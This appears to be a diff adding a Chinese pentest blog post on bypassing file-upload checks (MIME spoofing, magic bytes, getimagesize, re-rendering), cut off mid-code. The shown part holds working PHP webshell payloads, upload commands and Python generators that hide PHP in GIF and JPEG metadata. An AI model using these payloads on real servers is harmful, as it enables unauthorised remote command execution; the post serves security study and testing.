@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="概述文件上传是Web应用中最常见的攻击面之一。开发者常依赖Content-Type头、文件扩展名、魔术字节和getimagesize()限制上传类型，但这些机制均可被绕过。本文系统剖析从MIME伪造到二次渲染对抗的完整攻击链，以及ExifTool注入等进阶手法。 免责声明：本文技术仅供安全研究与授权测试使用。未经授权对目标系统攻击可能违反法律法规，作者不承担任何误用责任。  1. 防御机制与绕过难">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞：内容类型与MIME绕过">
+<meta property="og:url" content="https://congliang.github.io/File-upload-content-type-bypass/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="概述文件上传是Web应用中最常见的攻击面之一。开发者常依赖Content-Type头、文件扩展名、魔术字节和getimagesize()限制上传类型，但这些机制均可被绕过。本文系统剖析从MIME伪造到二次渲染对抗的完整攻击链，以及ExifTool注入等进阶手法。 免责声明：本文技术仅供安全研究与授权测试使用。未经授权对目标系统攻击可能违反法律法规，作者不承担任何误用责任。  1. 防御机制与绕过难">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.871Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/File-upload-content-type-bypass/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/File-upload-content-type-bypass/","path":"File-upload-content-type-bypass/","title":"文件上传漏洞：内容类型与MIME绕过"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件上传漏洞：内容类型与MIME绕过 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E9%9A%BE%E5%BA%A6"><span class="nav-number">2.</span> <span class="nav-text">1. 防御机制与绕过难度</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Content-Type%E5%A4%B4%E9%83%A8%E4%BC%AA%E9%80%A0"><span class="nav-number">3.</span> <span class="nav-text">2. Content-Type头部伪造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%AD%94%E6%9C%AF%E5%AD%97%E8%8A%82%EF%BC%88Magic-Bytes%EF%BC%89%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">3. 魔术字节（Magic Bytes）绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 常见文件幻数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E4%BB%85%E6%A3%80%E6%B5%8Bfileinfo%E7%9A%84%E5%9C%BA%E6%99%AF"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 仅检测fileinfo的场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E7%BB%95%E8%BF%87getimagesize"><span class="nav-number">5.</span> <span class="nav-text">4. 绕过getimagesize()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">5. 二次渲染绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%8E%9F%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-GIF-%E2%80%94-%E6%B3%A8%E9%87%8A%E6%89%A9%E5%B1%95%E5%9D%97%E6%B3%95"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 GIF — 注释扩展块法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-JPEG-%E2%80%94-COM%E6%AE%B5%E6%B3%A8%E5%85%A5"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 JPEG — COM段注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-PNG-%E2%80%94-%E8%BE%85%E5%8A%A9%E5%9D%97%E6%B3%A8%E5%85%A5"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 PNG — 辅助块注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-ExifTool%E5%85%83%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5-CVE-2021-22204"><span class="nav-number">7.</span> <span class="nav-text">6. ExifTool元数据注入 (CVE-2021-22204)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-PoC%E6%9E%84%E9%80%A0"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 PoC构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E7%82%B9%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 其他注入点与防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E5%9B%BE%E7%89%87%E9%A9%AC%E5%AE%9E%E6%88%98%E9%80%9F%E6%9F%A5"><span class="nav-number">8.</span> <span class="nav-text">7. 图片马实战速查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 快速生成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E4%B8%8A%E4%BC%A0%E5%90%8E%E8%A7%A3%E6%9E%90%E8%B7%AF%E5%BE%84"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 上传后解析路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">8.3.</span> <span class="nav-text">7.3 配置文件攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E7%BB%BC%E5%90%88%E9%98%B2%E5%BE%A1"><span class="nav-number">9.</span> <span class="nav-text">8. 综合防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%A0%B8%E5%BF%83%E5%AE%9E%E7%8E%B0"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 纵深防御核心实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9A%94%E7%A6%BB"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 Web服务器隔离</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E8%A1%A5%E5%85%85%E6%8E%AA%E6%96%BD"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 补充措施</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">10.</span> <span class="nav-text">9. 绕过手法速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E6%80%BB%E7%BB%93"><span class="nav-number">11.</span> <span class="nav-text">10. 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/File-upload-content-type-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件上传漏洞：内容类型与MIME绕过 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传漏洞：内容类型与MIME绕过
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-06-15T08:00:00+08:00">2025-06-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>文件上传是Web应用中最常见的攻击面之一。开发者常依赖Content-Type头、文件扩展名、魔术字节和<code>getimagesize()</code>限制上传类型，但这些机制均可被绕过。本文系统剖析从MIME伪造到二次渲染对抗的完整攻击链，以及ExifTool注入等进阶手法。</p>
+<p><strong>免责声明</strong>：本文技术仅供安全研究与授权测试使用。未经授权对目标系统攻击可能违反法律法规，作者不承担任何误用责任。</p>
+<hr>
+<h2 id="1-防御机制与绕过难度"><a href="#1-防御机制与绕过难度" class="headerlink" title="1. 防御机制与绕过难度"></a>1. 防御机制与绕过难度</h2><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>检测机制</th>
+<th>绕过难度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>L1</td>
+<td>前端JS校验扩展名</td>
+<td>无</td>
+</tr>
+<tr>
+<td>L2</td>
+<td>Content-Type请求头</td>
+<td>极低</td>
+</tr>
+<tr>
+<td>L3</td>
+<td>扩展名黑&#x2F;白名单</td>
+<td>低-中</td>
+</tr>
+<tr>
+<td>L4</td>
+<td>fileinfo魔术字节</td>
+<td>中</td>
+</tr>
+<tr>
+<td>L5</td>
+<td><code>getimagesize()</code></td>
+<td>中</td>
+</tr>
+<tr>
+<td>L6</td>
+<td>GD&#x2F;ImageMagick二次渲染</td>
+<td>高</td>
+</tr>
+<tr>
+<td>L7</td>
+<td>内容语义深度解析</td>
+<td>极高</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="2-Content-Type头部伪造"><a href="#2-Content-Type头部伪造" class="headerlink" title="2. Content-Type头部伪造"></a>2. Content-Type头部伪造</h2><p><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>的值来自HTTP multipart请求中客户端声明的<code>Content-Type</code>，并非服务端检测结果。后端若仅信任此字段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] != <span class="string">&#x27;image/jpeg&#x27;</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;仅允许JPEG&#x27;</span>); &#125;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/uploads/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>curl一行绕过</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https://target/upload -F <span class="string">&quot;file=@shell.php;type=image/jpeg&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Python</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>Burp Suite</strong>：抓包将<code>Content-Type: application/x-php</code>改为<code>image/png</code>。</p>
+<p><strong>防御</strong>：永远不信任客户端MIME；使用<code>finfo</code>在服务端独立检测。</p>
+<hr>
+<h2 id="3-魔术字节（Magic-Bytes）绕过"><a href="#3-魔术字节（Magic-Bytes）绕过" class="headerlink" title="3. 魔术字节（Magic Bytes）绕过"></a>3. 魔术字节（Magic Bytes）绕过</h2><h3 id="3-1-常见文件幻数"><a href="#3-1-常见文件幻数" class="headerlink" title="3.1 常见文件幻数"></a>3.1 常见文件幻数</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>Hex</th>
+<th>ASCII</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GIF89a</td>
+<td><code>47 49 46 38 39 61</code></td>
+<td><code>GIF89a</code></td>
+</tr>
+<tr>
+<td>GIF87a</td>
+<td><code>47 49 46 38 37 61</code></td>
+<td><code>GIF87a</code></td>
+</tr>
+<tr>
+<td>PNG</td>
+<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
+<td><code>\x89PNG\r\n\x1a\n</code></td>
+</tr>
+<tr>
+<td>JPEG</td>
+<td><code>FF D8 FF E0</code></td>
+<td>—</td>
+</tr>
+<tr>
+<td>PDF</td>
+<td><code>25 50 44 46</code></td>
+<td><code>%PDF</code></td>
+</tr>
+</tbody></table>
+<h3 id="3-2-仅检测fileinfo的场景"><a href="#3-2-仅检测fileinfo的场景" class="headerlink" title="3.2 仅检测fileinfo的场景"></a>3.2 仅检测fileinfo的场景</h3><p>当后端用<code>finfo</code>验证文件类型但保留用户提供的扩展名时：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$tmp</span>), [<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp</span>, <span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 扩展名可控</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过——在WebShell前拼接合法文件头，<code>.php</code>扩展名保留：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GIF89a\n&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.gif.php</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\x89PNG\r\n\x1a\n&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.png.php</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-绕过getimagesize"><a href="#4-绕过getimagesize" class="headerlink" title="4. 绕过getimagesize()"></a>4. 绕过getimagesize()</h2><p><code>getimagesize()</code>解析图像结构并返回尺寸数组，返回<code>false</code>表示校验失败。GIF的校验极为宽松——只要文件以<code>GIF89a</code>或<code>GIF87a</code>开头即通过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;GIF89a&lt;?php @eval($_POST[&quot;x&quot;]);?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line">php -r <span class="string">&#x27;var_dump(getimagesize(&quot;shell.php&quot;));&#x27;</span>  // 返回合法数组，而非<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PNG绕过</strong>：需最小合法结构。最简单方式是在完整PNG尾部追加PHP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> avatar.png evil.png.php</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;x&quot;]);?&gt;&#x27;</span> &gt;&gt; evil.png.php</span><br></pre></td></tr></table></figure>
+
+<p><code>getimagesize()</code>仅解析PNG头部块，不关心IEND之后的数据。PHP解释器则扫描整个文件寻找<code>&lt;?php</code>标签。</p>
+<p><strong>合法图像拼接</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert -size 1x1 xc:white valid.gif</span><br><span class="line"><span class="built_in">cat</span> valid.gif &gt; bypass.php.gif</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt;&gt; bypass.php.gif</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：若服务器仅解析<code>.php</code>扩展名（Nginx+PHP-FPM默认配置），<code>.gif</code>不会直接执行。需配合Apache多后缀（<code>shell.gif.php</code>）、Nginx路径截断（<code>/shell.gif/1.php</code> + <code>cgi.fix_pathinfo=1</code>）或LFI利用。</p>
+<hr>
+<h2 id="5-二次渲染绕过"><a href="#5-二次渲染绕过" class="headerlink" title="5. 二次渲染绕过"></a>5. 二次渲染绕过</h2><h3 id="5-1-原理"><a href="#5-1-原理" class="headerlink" title="5.1 原理"></a>5.1 原理</h3><p>部分CMS使用GD&#x2F;ImageMagick对上传图像重编码，摧毁文件中嵌入的PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>, <span class="variable">$uploadPath</span>, <span class="number">90</span>);  <span class="comment">// PHP代码在此被丢弃</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过核心思路</strong>：将PHP代码嵌入图像库不会触动的元数据段（注释块、APP段）或像素数据中，而非简单拼接在文件尾部。</p>
+<h3 id="5-2-GIF-—-注释扩展块法"><a href="#5-2-GIF-—-注释扩展块法" class="headerlink" title="5.2 GIF — 注释扩展块法"></a>5.2 GIF — 注释扩展块法</h3><p>GD库重编码GIF时会保留注释扩展块（<code>\x21\xFE</code>）的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_gif_webshell</span>(<span class="params">path, cmd=<span class="string">&#x27;system($_GET[&quot;cmd&quot;]);&#x27;</span></span>):</span><br><span class="line">    php = <span class="string">f&#x27;&lt;?php <span class="subst">&#123;cmd&#125;</span> ?&gt;&#x27;</span>.encode()</span><br><span class="line">    comment = <span class="string">b&#x27;\x21\xFE&#x27;</span> + <span class="built_in">bytes</span>([<span class="built_in">len</span>(php)]) + php + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    body = (<span class="string">b&#x27;GIF89a\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff&#x27;</span> +</span><br><span class="line">            comment + <span class="string">b&#x27;\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4C\x01\x00\x3B&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br></pre></td></tr></table></figure>
+
+<p>二次渲染后，像素数据重写但注释块保全，PHP代码幸存。</p>
+<h3 id="5-3-JPEG-—-COM段注入"><a href="#5-3-JPEG-—-COM段注入" class="headerlink" title="5.3 JPEG — COM段注入"></a>5.3 JPEG — COM段注入</h3><p>JPEG压缩改变像素，但许多库保留COM注释段（<code>FF FE</code>）和APPn应用段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inject_jpeg_com</span>(<span class="params">in_path, out_path, php_code</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(in_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    php = <span class="string">b&#x27;&lt;?php &#x27;</span> + php_code.encode() + <span class="string">b&#x27; __halt_compiler();&#x27;</span></span><br><span class="line">    data[<span class="number">2</span>:<span class="number">2</span>] = <span class="string">b&#x27;\xFF\xFE&#x27;</span> + <span class="built_in">len</span>(php).to_bytes(<span class="number">2</span>, <span class="string">&#x27;big&#x27;</span>) + php</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        